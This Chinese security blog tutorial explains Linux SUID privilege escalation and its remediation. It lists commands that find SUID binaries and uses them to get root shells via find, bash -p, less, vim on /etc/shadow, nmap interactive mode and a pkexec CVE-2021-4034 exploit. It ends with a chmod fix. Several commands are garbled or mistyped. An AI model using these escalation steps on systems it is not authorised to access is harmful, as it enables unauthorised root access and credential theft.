---
title: 权限提升 | suid提权及修复方式
url: https://www.secpulse.com/archives/191699.html
source: 安全脉搏
date: 2022-11-18
fetch_date: 2025-10-03T23:05:26.600303
---

# 权限提升 | suid提权及修复方式

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 权限提升 | suid提权及修复方式

[资讯](https://www.secpulse.com/archives/category/news)

[贝塔安全实验室](https://www.secpulse.com/newpage/author?author_id=9525)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-17

12,952

通常Linux系统文件及目录最常见的三种权限为：可读权限(r)，可写权限(w)和可执行权限(x)。有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如/usr/bin/passwd文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID权限。此时，如果该文件的属主权限为root，并能够执行命令操作，攻击者便可以root身份进行操作Linux系统。常见导致SUID提权的可执行程序包含：Nmap、vim、find、bash、more、less、nano、pkexec等，当查询这些可执行程序具有SUID权限时，可进一步排查是否存在权限提升安全问题，并对存在安全的程序进行修复和加固。

接下来，本节将利用find命令，查询Linux系统中具有SUID权限的文件

```
find / -perm -u=s -type f 2>/dev/nullfind / -perm -g=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/nullfind / -user root -perm -4000 -exec ls -l db {};
/ 表示从文件系统的顶部（根）开始并找到每个目录-perm 表示搜索随后的权限-u=s 表示查找root用户拥有的文件-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件2 表示该进程的第二个文件描述符，即stderr（标准错误）> 表示重定向/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667814.png)

通过指令查询，可以看到find和pkexec具有SUID权限，接下来测试find和pkexec可行性程序是否能够提权成功，通过find指令进行操作使普通用户变成了root权限执行系统指令：

```
/usr/bin/find -name 123.ico -exec whoami ;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-16686678141.png)

polkit的 pkexec （pkexec ≤ 0.120版本时）存在特权提升的安全问题。该漏洞允许任何非特权用户通过在Linux默认配置中利用此漏洞获得root权限。执行过程如图3-1-20所示，通过exp文件进行操作使普通用户变成了root权限执行系统指令。

```
make
./cve-202104034
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667815.png)

下面列举了一些其他的软件导致suid提权的方式：

(1)nmap

```
nmap --interactive #启动交互模式
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-16686678151.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667816.png)

(2)bash

```
bash -p
bash-3.2# id
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667817.png)

(3)more/less

```
less /etc/passwd
!/bin/sh
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667819.png)

(4)vim

```
vim.tiny /etc/shadow
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667821.png)

```
# Press ESC key
:set shell=/bin/sh  #回车
:shell
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667822.png)

对于存在suid权限的可执行程序中，如果导致权限提升安全威胁，可通过修改可执行程序权限的方式或更新软件进行打补丁的方式修复suid权限文件导致的安全问题，可以修改suid可执行文件权限的修复过程。

```
chmod u-s /usr/bin/find
find / -perm -u=s -type f 2>/dev/null
touch test
/uer/bin/find -name test -exec whoami ;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191699-1668667823.png)

**本文作者：[贝塔安全实验室](newpage/author?author_id=9525)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/191699.html**](https://www.secpulse.com/archives/191699.html)

Tags: [bash](https://www.secpulse.com/archives/tag/bash)、[find](https://www.secpulse.com/archives/tag/find)、[less](https://www.secpulse.com/archives/tag/less)、[more](https://www.secpulse.com/archives/tag/more)、[nano](https://www.secpulse.com/archives/tag/nano)、[Nmap](https://www.secpulse.com/archives/tag/nmap)、[Pkexec](https://www.secpulse.com/archives/tag/pkexec)、[suid提权](https://www.secpulse.com/archives/tag/suid%E6%8F%90%E6%9D%83)、[vim](https://www.secpulse.com/archives/tag/vim)

点赞：
1
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![实战！记一次超简单渗透过程笔记](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1685526754726-300x191.png)

  实战！记一次超简单渗透过程笔记](https://www.secpulse.com/archives/201229.html "详细阅读 实战！记一次超简单渗透过程笔记")
* [![组播路由介绍以及攻击实战](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/1673599228763-300x212.png)

  组播路由介绍以及攻击实战](https://www.secpulse.com/archives/195069.html "详细阅读 组播路由介绍以及攻击实战")
* [![端口开放测试](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/09/1663915972810-300x211.png)

  端口开放测试](https://www.secpulse.com/archives/187604.html "详细阅读 端口开放测试")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/08/1db8ec186f5e122a1420ccb5499c476d-150x150.png)](https://www.secpulse.com/newpage/author?author_id=9525aaa) | [贝塔安全实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=9525) | |
| 文章数：29 | 积分： 65 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11...